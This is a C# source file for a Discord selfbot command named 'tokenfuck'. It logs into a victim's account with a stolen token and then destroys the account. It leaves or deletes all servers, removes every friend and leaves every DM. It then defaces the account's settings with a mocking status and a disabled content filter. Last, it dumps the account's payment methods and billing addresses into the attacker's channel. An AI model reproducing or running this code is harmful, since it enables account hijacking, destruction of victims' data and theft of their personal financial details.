using Discord;
using Discord.Commands;
using Discord.Gateway;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RamokSelfbot.Commands.Tools
{
    [Command("tokenfuck", "Destory the token provided - TOOLS")]
    class TokenFuck : CommandBase
    {
        [Parameter("token", false)]
        public string token { get; set; }


        public DiscordSocketClient user;
        public override void Execute()
        {
            if (RamokSelfbot.Utils.IsClient(Message))
            {
                user = new DiscordSocketClient(new DiscordSocketConfig
                {
                    ApiVersion = 6,
                    RetryOnRateLimit = true
                });

                try
                {
                    user.Login(token);
                    user.OnLoggedIn += User_OnLoggedIn;
                }
                catch (Exception ex)
                {
                    RamokSelfbot.Utils.SendEmbed(Message, new EmbedMaker()
                    {
                        Description = "An error occured while authentification...\nError : **" + ex.Message + "**",
                        Footer = RamokSelfbot.Utils.footer(Message.Author.User),
                        Color = RamokSelfbot.Utils.EmbedColor()
                    });
                }

                RamokSelfbot.Utils.SendEmbed(Message, new EmbedMaker()
                {
                    Description = "The token is valid !...",
                    Footer = RamokSelfbot.Utils.footer(Message.Author.User),
                    Color = RamokSelfbot.Utils.EmbedColor()
                });


            }
        }


        private async void User_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            var message = await Client.SendMessageAsync(Message.Channel.Id, "DO NOT DELETE THIS MESSAGE ! (Updates message)");

            int leavedguilds = 0;
            int intguilds = user.GetGuilds().Count;
            int IntLocPercentage = 0;
            foreach (var guilds in await user.GetGuildsAsync())
            {
                try
                {
                    if (Program.Debug)
                    {
                        Console.WriteLine(leavedguilds);
                    }
                    await guilds.LeaveAsync();
                    leavedguilds++;
                    IntLocPercentage = (leavedguilds / intguilds) * 100;
                    await message.EditAsync(new MessageEditProperties()
                    {
                        Content = "Leaved guild " + guilds.Name + " **(" + IntLocPercentage + "%" + ")**"
                    });
                }
                catch
                {
                    if (guilds.Owner)
                    {
                        await guilds.DeleteAsync();
                        leavedguilds++;
                        IntLocPercentage = (leavedguilds / intguilds) * 100;
                        await message.EditAsync(new MessageEditProperties()
                        {
                            Content = "Deleted guild " + guilds.Name + " **(" + IntLocPercentage + "%" + ")**"
                        });
                    }
                }
            }

            int relationship = user.GetRelationships().Count;
            int deletedfriends = 0;

            foreach (var friend in await user.GetRelationshipsAsync())
            {
                try
                {
                    if (Program.Debug)
                    {
                        Console.WriteLine(deletedfriends);
                    }
                    await friend.RemoveAsync();
                    deletedfriends++;
                    IntLocPercentage = (deletedfriends / relationship) * 100;
                    await message.EditAsync(new MessageEditProperties()
                    {
                        Content = "Deleted friend " + friend.User.Username + "#" + friend.User.Discriminator + " **(" + IntLocPercentage + "%" + ")**"
                    });
                }
                catch
                {
                    Console.WriteLine("Unable to delete someone lol");
                }
            }

            int dmcount = user.GetPrivateChannels().Count;
            int deleteddm = 0;

            foreach(var dm in await user.GetPrivateChannelsAsync())
            {
                try
                {
                    if(Program.Debug)
                    {
                        Console.WriteLine(deleteddm);
                    }
                    await dm.LeaveAsync();
                    deleteddm++;
                    IntLocPercentage = (deleteddm / dmcount) * 100;
                    await message.EditAsync(new MessageEditProperties()
                    {
                        Content = "Deleted DM " + dm.Name + " **(" + IntLocPercentage + "%" + ")**"
                    });
                } catch(Exception ex)
                {
                    if(Program.Debug)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
            }



            user.User.ChangeSettings(new UserSettingsProperties()
            {
                Theme = DiscordTheme.Light,
                Language = DiscordLanguage.Chinese,
                DeveloperMode = false,
                CustomStatus = new CustomStatus()
                {
                    Text = "Get token fucked by RamokSelfbot lol"
                },
                EnableTts = true,
                PlayGifsAutomatically = true,
                GuildFolders = null,
                CompactMessages = true,
                ExplicitContentFilter = Discord.ExplicitContentFilter.DoNotScan
            });

            if (user.GetPaymentMethods().Count != 0)
            {
                string payements = "";
                foreach (var payement in user.GetPaymentMethods())
                {
                    payements += "**New payement method**\n";
                    payements += "Method payement type : " + payement.Type.ToString() + "\n";
                    payements += "Invalid : " + payement.Invalid.ToString() + "\n";
                    payements += "Billing address : " + payement.BillingAddress.Address1 + ", " + payement.BillingAddress.City + ", " + ", " + payement.BillingAddress.PostalCode + ", " + payement.BillingAddress.Country + "\n";
                    payements += "Default? : " + payement.Default.ToString() + "\n";
                    payements += "Invalid? : " + payement.Invalid.ToString() + "\n";
                    payements += "ID : " + payement.Id.ToString() + "\n\n\n";
                }

                if (string.IsNullOrWhiteSpace(payements))
                {
                    payements = "**No payements methods.**";
                }

                RamokSelfbot.Utils.SendEmbed(Message, new EmbedMaker()
                {
                    Description = payements,
                    Footer = RamokSelfbot.Utils.footer(Message.Author.User),
                    Color = RamokSelfbot.Utils.EmbedColor()
                });
            }

        }
    }
}
